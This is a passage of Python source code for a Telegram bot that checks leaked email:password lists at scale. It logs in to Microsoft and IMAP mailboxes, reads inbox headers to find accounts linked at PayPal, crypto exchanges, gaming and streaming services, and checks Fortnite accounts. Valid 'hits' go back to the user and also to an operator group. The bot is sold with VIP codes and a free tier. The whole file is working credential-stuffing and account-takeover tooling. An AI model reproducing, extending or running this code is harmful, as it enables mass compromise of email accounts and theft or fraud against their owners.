            fb = self.check_facebook(at, cid, email_addr) 
            if fb.get("facebook_status") == "LINKED": 
                out["Facebook"] = True 
        except: fb = {} 
        # Additional service checks via search 
        psn = self.check_psn(at, cid) 
        if psn.get("psn_status") == "HAS_ORDERS": 
            out["PSN"] = True 
        st = self.check_steam_simple(at, cid) 
        if st.get("steam_status") == "HAS_PURCHASES": 
            out["Steam"] = True 
        mc = self.check_minecraft_simple(at, cid) 
        if mc.get("minecraft_status") == "OWNED": 
            out["Minecraft"] = True 
        pp = self.check_paypal_simple(at, cid) 
        if pp.get("paypal_status") == "LINKED": 
            out["PayPal"] = True 
        ep = self.check_epic_simple(at, cid) 
        if ep.get("epic_status") == "LINKED": 
            out["Epic Games"] = True 
        # Generic IMAP header scan for mapped services and optional custom domain 
        try: 
            mail, err = self._imap_xoauth2_connect(email_addr, at, 'imap-mail.outlook.com', 993) 
            if mail: 
                try: 
                    mail.select('INBOX', readonly=True) 
                    typ, data = mail.search(None, 'ALL') 
                    ids = data[0].split() if data and data[0] else [] 
                    ids = list(reversed(ids[-400:] if len(ids) > 400 else ids)) 
                    for mid in ids: 
                        t, md = mail.fetch(mid, '(BODY.PEEK[HEADER])') 
                        if t != 'OK' or not md: 
                            continue 
                        raw = md[0][1] if isinstance(md[0], tuple) else b'' 
                        msg = email_lib.message_from_bytes(raw) 
                        frm = (msg.get('From') or '').lower() 
                        for dom, name in (self.services_map or {}).items(): 
                            if dom in frm: 
                                out[name] = True 
                finally: 
                    try: mail.logout() 
                    except: pass 
        except: 
            pass 
        return out, nf, fb 

    def check(self, email, password):
        try:
            auth = self._ms_hard_login(email, password)
            if not auth or not auth.get("access_token"): return {"status": "BAD"}
            at = auth["access_token"]
            cid = auth.get("cid", "")
            country, name = self._profile(at, cid)
            msg_count = self._graph_msg_count(at)
            msr = self.check_microsoft_subscriptions(email, password, at, cid)
            found_services, nf_details, fb_details = self._scan_services(at, cid, email)
            return {"status": "HIT", "country": country, "name": name, "msg_count": msg_count, "email": email, "password": password, "services": found_services, **msr}
        except: return {"status": "BAD"}

def build_balance_text(ms_data):
    parts = []
    if isinstance(ms_data, dict):
        if "balances" in ms_data: parts.extend(ms_data["balances"])
        elif "balance_amount" in ms_data: parts.append(format_currency(ms_data.get("balance_amount"), ms_data.get("balance_currency")))
        if "cards" in ms_data: parts.extend(ms_data["cards"])
        if "rewards_points" in ms_data: parts.append(f"Rewards:{ms_data['rewards_points']}")
    return " | ".join([p for p in parts if p]) if parts else "0.0 USD"

def format_result(res):
    email = res.get("email", ""); password = res.get("password", "")
    country = (res.get("country") or "??").strip().upper()
    parts = [f"{email}:{password}", country]
    xbox = res.get("xbox", {}) or {}
    if xbox.get("status","").upper() != "FREE": parts.append(f"Xbox: {xbox.get('details')}")
    btxt = build_balance_text(res.get("ms_data", {}))
    if btxt: parts.append(btxt)
    sv = res.get("services", {}) or {}
    found = [k for k, v in sv.items() if v]
    if found: parts.append(", ".join(found[:10]))
    return " | ".join(parts)

# ------------------- IMAP Checker -------------------
IMAP_SERVERS = {"gmail.com": {"host": "imap.gmail.com", "port": 993}, "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993}, "icloud.com": {"host": "imap.mail.me.com", "port": 993}, "aol.com": {"host": "imap.aol.com", "port": 993}, "zoho.com": {"host": "imap.zoho.com", "port": 993}, "fastmail.com": {"host": "imap.fastmail.com", "port": 993}, "yandex.com": {"host": "imap.yandex.com", "port": 993}, "yandex.ru": {"host": "imap.yandex.ru", "port": 993}, "mail.ru": {"host": "imap.mail.ru", "port": 993}, "bk.ru": {"host": "imap.mail.ru", "port": 993}, "list.ru": {"host": "imap.mail.ru", "port": 993}, "inbox.ru": {"host": "imap.mail.ru", "port": 993}, "gmx.net": {"host": "imap.gmx.net", "port": 993}, "gmx.com": {"host": "imap.gmx.com", "port": 993}, "web.de": {"host": "imap.web.de", "port": 993}, "t-online.de": {"host": "imap.t-online.de", "port": 993}, "qq.com": {"host": "imap.qq.com", "port": 993}, "163.com": {"host": "imap.163.com", "port": 993}, "126.com": {"host": "imap.126.com", "port": 993}, "protonmail.com": {"host": "imap.protonmail.com", "port": 993}, "proton.me": {"host": "imap.proton.me", "port": 993}}
IMAP_SERVICES = {"Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com", "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com", "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com", "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com", "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv", "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com", "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com", "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com", "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com", "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com", "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com", "Snapchat": "snapchat.com", "Pinterest": "pinterest.com"}

def _decode_mime(text):
    if not text: return ""
    parts = decode_hdr(text); res = []
    for p, e in parts:
        if isinstance(p, bytes):
            try: res.append(p.decode(e or 'utf-8', errors='ignore'))
            except: res.append(p.decode('utf-8', errors='ignore'))
        else: res.append(str(p))
    return ''.join(res)

def _get_imap_config(em):
    dom = em.lower().split('@')[-1]
    return IMAP_SERVERS.get(dom, {"host": f"imap.{dom}", "port": 993})

def _imap_connect(em, pw):
    cfg = _get_imap_config(em)
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'], ssl_context=ctx)
        mail.socket().settimeout(12); res, _ = mail.login(em, pw)
        return mail if res == 'OK' else None
    except: return None

class ImapChecker:
    def check(self, em, pw):
        try:
            mail = _imap_connect(em, pw)
            if not mail: return {"status": "BAD"}
            cnt = 0
            try:
                r, _ = mail.select('INBOX')
                if r == 'OK':
                    r2, d2 = mail.search(None, 'ALL')
                    if r2 == 'OK' and d2[0]: cnt = len(d2[0].split())
            except: pass
            found = set()
            try:
                r, d = mail.search(None, 'ALL')
                if r == 'OK' and d[0]:
                    ids = d[0].split()
                    for eid in ids[-500:]:
                        r2, md = mail.fetch(eid, '(BODY.PEEK[HEADER])')
                        if r2 == 'OK' and md[0]:
                            msg = email_lib.message_from_bytes(md[0][1] if isinstance(md[0], tuple) else b'')
                            frm = _decode_mime(msg.get('From', '')).lower()
                            for s, p in IMAP_SERVICES.items():
                                if p in frm: found.add(s)
            except: pass
            try: mail.logout()
            except: pass
            return {"status": "HIT", "email": em, "msg_count": cnt, "services": {s: True for s in found}, "imap_mode": True}
        except: return {"status": "BAD"}

class ScanSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id; self.stop_ev = threading.Event(); self.results = []; self.results_services = []; self.results_xbox = []
        self.total = 0; self.checked = 0; self.hits = 0; self.bads = 0; self.batch = []; self.batch_services = []; self.batch_xbox = []
        self.hits_batch_lock = threading.Lock(); self.last_status_time = 0.0; self.awaiting_domain = False; self.custom_domain = None
        self.pending_accounts = None; self.status_msg_id = None; self.xbox_premium = 0; self.country_counts = {}; self.service_counts = {}
        self.is_fortnite = False; self.awaiting_vip_code = False; self.is_imap = False; self.accounts_microsoft = []; self.accounts_another = []
        self.imap_hits_by_domain = {}; self.fn_hits = 0; self.fn_bads = 0; self.fn_2fa = 0; self.fn_headless = 0; self.fn_xbox = 0; self.fn_banned = 0
    def stop(self): self.stop_ev.set()

class BotApp:
    def __init__(self): self.offset = None; self.sessions = {}; self.lock = threading.Lock()

    def _send_status(self, sess, chat_id, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 5: return
        vip_tag = " [VIP]" if chat_id in vip_users_info else ""
        with self.lock:
            if sess.is_fortnite: msg = f"🎮 Fortnite Checker Status{vip_tag}\nChecked: {sess.checked}/{sess.total}\nHits: {sess.fn_hits}\nBad: {sess.fn_bads}\n2FA: {sess.fn_2fa}\nHeadless: {sess.fn_headless}\nXbox: {sess.fn_xbox}\nBanned: {sess.fn_banned}\nBy : anon\nchannel : @anon_main1"
            elif sess.is_imap: msg = f"Q bot mail access checker{vip_tag}\nhits : {sess.hits}\nbad : {sess.bads}\ntype : {', '.join([f'{d}:{c}' for d, c in sess.imap_hits_by_domain.items()]) or '-'}\nservices : {', '.join([f'{k}:{v}' for k, v in sorted(sess.service_counts.items(), key=lambda x: -x[1])[:10]]) or '-'}\nBy : anon\nchannel : @anon_main1"
            else: msg = f"Q bot mail access checker{vip_tag}\nhits : {sess.hits}\nbad : {sess.bads}\nxbox : {sess.xbox_premium}\ncountry : {', '.join([f'{k}:{v}' for k, v in sorted(sess.country_counts.items(), key=lambda x: -x[1])[:10]]) or '-'}\nservices : {', '.join([f'{k}:{v}' for k, v in sorted(sess.service_counts.items(), key=lambda x: -x[1])[:10]]) or '-'}\nBy : anon\nchannel : @anon_main1"
        if sess.status_msg_id: edit_message(chat_id, sess.status_msg_id, msg)
        else:
            try: r = send_message(chat_id, msg); sess.status_msg_id = r.get("result", {}).get("message_id")
            except: pass
        sess.last_status_time = now

    def _flush_batch(self, sess, chat_id):
        with sess.hits_batch_lock:
            try:
                def sfn(lines, fname):
                    if not lines: return
                    path = os.path.join(os.getcwd(), fname)
                    with open(path, "w", encoding="utf-8") as f: f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
                    send_document(chat_id, path, caption=f"{fname.split('.')[0]} batch ({len(lines)})")
                    try: send_document(GROUP_ID, path, caption=f"{fname.split('.')[0]} batch ({len(lines)})")
                    except: pass
                    try: os.remove(path)
                    except: pass
                sfn(sess.batch, "hits.txt"); sfn(sess.batch_services, "services.txt"); sfn(sess.batch_xbox, "xbox.txt")
                sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()
            except: pass

    def start_scan(self, chat_id, accounts):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess: sess = ScanSession(chat_id); self.sessions[chat_id] = sess
        sess.total = len(accounts); sess.checked = 0; sess.hits = 0; sess.bads = 0; sess.results.clear()
        kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
        vtag = " [VIP]" if chat_id in vip_users_info else ""
        send_message(chat_id, f"Started {'Fortnite' if sess.is_fortnite else 'Mail Access'} scan: {sess.total} accounts{vtag}", reply_markup=kb)
        self._send_status(sess, chat_id, force=True)

        def worker(acc):
            if sess.stop_ev.is_set(): return
            em, pw = acc
            if sess.is_fortnite:
                try:
                    r = FortniteLogic().check_account(f"{em}:{pw}")
                    with self.lock:
                        sess.checked += 1
                        if r["status"] == "HIT":
                            sess.fn_hits += 1; line = f"🎮 Fortnite HIT: {em}:{pw} | Skins: {len(r.get('skins', []))} | Vbucks: {r.get('vbucks', 0)} | ID: {r.get('acc_id', 'N/A')}"
                            send_message(GROUP_ID, f"🎮 Fortnite HIT: {em}:{pw}{vtag}\nSkins: {len(r.get('skins', []))}\nVbucks: {r.get('vbucks', 0)}\nID: {r.get('acc_id', 'N/A')}")
                            sess.results.append(line)
                        elif r["status"] == "2FA": sess.fn_2fa += 1
                        elif r["status"] == "XBOX": sess.fn_xbox += 1
                        elif r["status"] == "BANNED": sess.fn_banned += 1
                        else: sess.fn_bads += 1
                except:
                    with self.lock: sess.checked += 1; sess.fn_bads += 1
            elif sess.is_imap:
                try: r = ImapChecker().check(em, pw)
                except: r = {"status": "BAD"}
                with self.lock: sess.checked += 1
                if r.get("status") == "HIT":
                    line = f"{em}:{pw}"; sv = r.get("services", {}); svf = [k for k, v in sv.items() if v]
                    if svf: line += f" | Services: {', '.join(svf)}"
                    dom = em.split("@")[-1].lower()
                    with self.lock:
                        sess.results.append(line); sess.hits += 1; sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
                        for k, v in sv.items():
                            if v: sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                    with sess.hits_batch_lock:
                        sess.batch.append(line)
                        if len(sess.batch) >= 100: self._flush_batch(sess, chat_id)
                    send_message(GROUP_ID, f"📧 IMAP HIT: {line}{vtag}")
                else:
                    with self.lock: sess.bads += 1
            else:
                try:
                    checker = UnifiedChecker()
                    if sess.custom_domain: checker.services_map[sess.custom_domain.strip()] = "Custom"
                    r = checker.check(em, pw)
                except: r = {"status": "BAD"}
                with self.lock: sess.checked += 1
                if r.get("status") == "HIT":
                    line = format_result(r); send_message(GROUP_ID, f"📧 Mail HIT: {line}{vtag}")
                    sv = r.get("services", {}); svf = [k for k, v in sv.items() if v]
                    sv_line = f"{em}:{pw} | Services: {', '.join(svf)}" if svf else None
                    xb = r.get("xbox", {}); xdet = xb.get("details") or ""
                    xb_line = f"{em}:{pw} | Xbox: {xdet}" if xb.get("status","").upper() != "FREE" and xdet else None
                    with self.lock:
                        sess.results.append(line); sess.hits += 1
                        if sv_line: sess.results_services.append(sv_line)
                        if xb_line: sess.results_xbox.append(xb_line)
                        if xb.get("status","").upper() != "FREE": sess.xbox_premium += 1
                        c = (r.get("country") or "??").strip().upper(); sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
                        for k, v in sv.items():
                            if v: sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                    with sess.hits_batch_lock:
                        sess.batch.append(line)
                        if sv_line: sess.batch_services.append(sv_line)
                        if xb_line: sess.batch_xbox.append(xb_line)
                        if len(sess.batch) >= 100: self._flush_batch(sess, chat_id)
                else:
                    with self.lock: sess.bads += 1
            if sess.checked % 20 == 0: self._send_status(sess, chat_id)
            time.sleep(0.12)

        ex = ThreadPoolExecutor(max_workers=15); fs = [ex.submit(worker, acc) for acc in accounts]
        for f in fs:
            if sess.stop_ev.is_set(): break
            try: f.result(timeout=60)
            except: pass
        self.finish(chat_id)

    def finish(self, chat_id):
        with self.lock: sess = self.sessions.get(chat_id)
        if not sess: return
        self._flush_batch(sess, chat_id); name = f"results_{uuid.uuid4().hex[:8]}.txt"; path = os.path.join(os.getcwd(), name)
        try:
            with open(path, "w", encoding="utf-8") as f:
                for ln in sess.results: f.write(ln + " | BY : @T_Q_mailbot\n")
            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
            try: send_document(GROUP_ID, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
            except: pass
        except: send_message(chat_id, "Failed to prepare results")
        with self.lock: self.sessions.pop(chat_id, None)

    def handle_file(self, chat_id, file_id):
        data = get_file(file_id); accounts = parse_accounts_bytes(data)
        if not accounts: send_message(chat_id, "No valid accounts found"); return
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess: sess = ScanSession(chat_id); self.sessions[chat_id] = sess
        sess.pending_accounts = accounts
        if sess.is_fortnite:
            if chat_id in vip_users_info: self._handle_vip_flow(chat_id, sess)
            else: send_message(chat_id, "Choose your plan to start Fortnite scan:", reply_markup={"inline_keyboard": [[{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}], [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]]})
            return
        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
        sess.accounts_microsoft = []; sess.accounts_another = []
        for em, pw in accounts:
            if any(dom in em for dom in ms_domains): sess.accounts_microsoft.append((em, pw))
            else: sess.accounts_another.append((em, pw))
        send_message(chat_id, "Select accounts to scan:", reply_markup={"inline_keyboard": [[{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]", "callback_data": f"MODE_SELECT_MS_{chat_id}"}], [{"text": f"another ( t-donline , sfr.fr , etc ) [{len(sess.accounts_another)}]", "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]]})

    def _handle_mode_select(self, chat_id, mode):
        with self.lock: sess = self.sessions.get(chat_id)
        if not sess: return
        sess.is_imap = (mode != "MS"); sess.pending_accounts = sess.accounts_microsoft if mode == "MS" else sess.accounts_another
        if chat_id in vip_users_info: self._handle_vip_flow(chat_id, sess)
        else: send_message(chat_id, "Choose your plan to start:", reply_markup={"inline_keyboard": [[{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}], [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]]})

    def _handle_vip_flow(self, chat_id, sess):
        if sess.is_fortnite: threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True).start()
        else: sess.awaiting_domain = True; send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup={"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]})

    def _handle_free_flow(self, chat_id, sess):
        allow, mins = check_user_limit(chat_id, 0); send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
        rec = user_usage.get(chat_id) or {}; rem = NORMAL_LIMIT - rec.get("count", 0)
        if rem <= 0:
            try: mins_left = max(1, int((VIP_WINDOW_SECONDS - (time.time() - rec.get("start", time.time()))) / 60) + 1)
            except: mins_left = 120
            send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes."); return
        to_scan = sess.pending_accounts[:rem]; allow, _ = check_user_limit(chat_id, len(to_scan))
        if not allow or not to_scan: send_message(chat_id, "Limit reached."); return
        if rec.get("count", 0) == 0: schedule_limit_reset_message(chat_id)
        threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True).start()

    def run(self):
        global awaiting_broadcast
        if not BOT_TOKEN: return
        while True:
            try:
                j = get_updates(self.offset); 
                if not j.get("ok"): time.sleep(2); continue
                for upd in j.get("result", []):
                    self.offset = upd["update_id"] + 1
                    if "message" in upd:
                        m = upd["message"]; chat_id = m["chat"]["id"]; from_id = m.get("from", {}).get("id"); all_users.add(chat_id)
                        if chat_id == ADMIN_ID and awaiting_broadcast and "text" in m:
                            awaiting_broadcast = False; msg = m["text"]
                            for uid in list(all_users):
                                try: send_message(uid, f"📢 Broadcast:\n{msg}")
                                except: pass
                            send_message(ADMIN_ID, "Broadcast sent!"); continue
                        if chat_id == ADMIN_ID and "text" in m:
                            t = m["text"].strip().lower()
                            if t in ("/start", "start"): send_message(chat_id, "Admin Panel:", reply_markup={"inline_keyboard": [[{"text": "code 1 day", "callback_data": "GEN_CODE_day"}], [{"text": "code 1 week", "callback_data": "GEN_CODE_week"}], [{"text": "code 1 month", "callback_data": "GEN_CODE_month"}], [{"text": "Broadcast Message", "callback_data": "ADMIN_BROADCAST"}], [{"text": "VIP Users", "callback_data": "ADMIN_VIP_LIST"}]]})
                        if "document" in m: self.handle_file(chat_id, m["document"]["file_id"])
                        elif "text" in m:
                            t = m["text"].strip(); sess = self.sessions.get(chat_id)
                            if sess and sess.awaiting_vip_code:
                                if t.lower() == "cancel": sess.awaiting_vip_code = False; self._handle_free_flow(chat_id, sess)
                                else: ok, msg = try_claim_vip(chat_id, t); send_message(chat_id, msg); 
                                if ok: sess.awaiting_vip_code = False; self._handle_vip_flow(chat_id, sess)
                                continue
                            if t.lower() in ("/start", "start"): send_message(chat_id, "Please choose a checker mode:", reply_markup={"inline_keyboard": [[{"text": "📧 Mail Access Checker", "callback_data": "MODE_MAIL"}], [{"text": "🎮 Fortnite Checker", "callback_data": "MODE_FORTNITE"}]]})
                            elif t.lower().startswith("code") or t.lower() == "codevipanon199":
                                code = t.split()[-1] if len(t.split()) > 1 else t; ok, msg = try_claim_vip(from_id, code); send_message(chat_id, msg)
                            elif t.lower() == "stop": self.handle_stop(chat_id)
                            elif sess and sess.awaiting_domain:
                                if t.lower() != "skip": sess.custom_domain = t
                                sess.awaiting_domain = False; threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True).start()
                    elif "callback_query" in upd:
                        cq = upd["callback_query"]; data = cq.get("data", ""); chat_id = cq["message"]["chat"]["id"]; sess = self.sessions.get(chat_id)
                        if chat_id == ADMIN_ID:
                            if data.startswith("GEN_CODE_"): d = data.split("_")[2]; c = create_vip_code(d); send_message(chat_id, f"Generated {d} code: `{c}`")
                            elif data == "ADMIN_BROADCAST": awaiting_broadcast = True; send_message(chat_id, "Send the message you want to broadcast:")
                            elif data == "ADMIN_VIP_LIST":
                                if not vip_users_info: send_message(chat_id, "No VIP users.")
                                else:
                                    for uid, info in vip_users_info.items():
                                        rem = max(0, int((info['expires'] - time.time()) / 3600))
                                        send_message(chat_id, f"User: {uid}\nCode: {info['code']}\nExpires in: {rem} hours", reply_markup={"inline_keyboard": [[{"text": "Revoke", "callback_data": f"REVOKE_{uid}"}]]})
                            elif data.startswith("REVOKE_"): uid = int(data.split("_")[1]); vip_users_info.pop(uid, None); send_message(chat_id, f"Revoked VIP for {uid}")
                        if data.startswith("STOP_"): self.handle_stop(chat_id)
                        elif data.startswith("MODE_SELECT_"): self._handle_mode_select(chat_id, "MS" if "MS" in data else "IMAP")
                        elif data.startswith("PLAN_FREE_"): 
                            if sess: self._handle_free_flow(chat_id, sess)
                        elif data.startswith("PLAN_VIP_"):
                            if sess: sess.awaiting_vip_code = True; send_message(chat_id, "Enter VIP code:", reply_markup={"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]})
                        elif data.startswith("PLAN_CANCEL_"): 
                            if sess: sess.awaiting_vip_code = False; self._handle_free_flow(chat_id, sess)
                        elif data.startswith("SKIP_"): 
                            if sess: sess.awaiting_domain = False; threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True).start()
                        elif data == "MODE_MAIL":
                            sess = ScanSession(chat_id); sess.is_fortnite = False; self.sessions[chat_id] = sess; send_message(chat_id, "Mail Mode. Send file.")
                        elif data == "MODE_FORTNITE":
                            sess = ScanSession(chat_id); sess.is_fortnite = True; self.sessions[chat_id] = sess; send_message(chat_id, "Fortnite Mode. Send file.")
            except: time.sleep(2)

if __name__ == "__main__": BotApp().run()
